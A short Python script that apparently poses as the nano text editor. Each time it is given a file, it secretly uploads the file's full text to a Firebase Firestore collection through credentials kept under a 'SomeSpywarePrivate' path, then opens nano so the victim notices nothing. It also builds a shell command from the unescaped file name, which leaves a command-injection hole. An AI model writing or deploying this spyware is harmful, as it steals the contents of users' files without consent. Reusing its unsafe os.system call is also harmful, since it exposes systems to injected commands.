import sys
import os
import firebase_admin
from firebase_admin import firestore
from firebase_admin import credentials

# Use your file here
cred = credentials.Certificate("../SomeSpywarePrivate/firebase_access_file.json")
firebase_admin.initialize_app(cred)


# Set a default value for the file_text
file_text = ""

print("length: " + str(len(sys.argv)))
if len(sys.argv) > 1:
    with open(sys.argv[1]) as file:
        file_text = file.read()

    db = firestore.client()

    data = {
        'text': file_text
    }

    doc_ref = db.collection('files').document()
    doc_ref.set(data)
    
    os.system("echo DebugInfo: Python code executed successfully.")
    os.system("nano " + sys.argv[1])
else:
    os.system("nano")

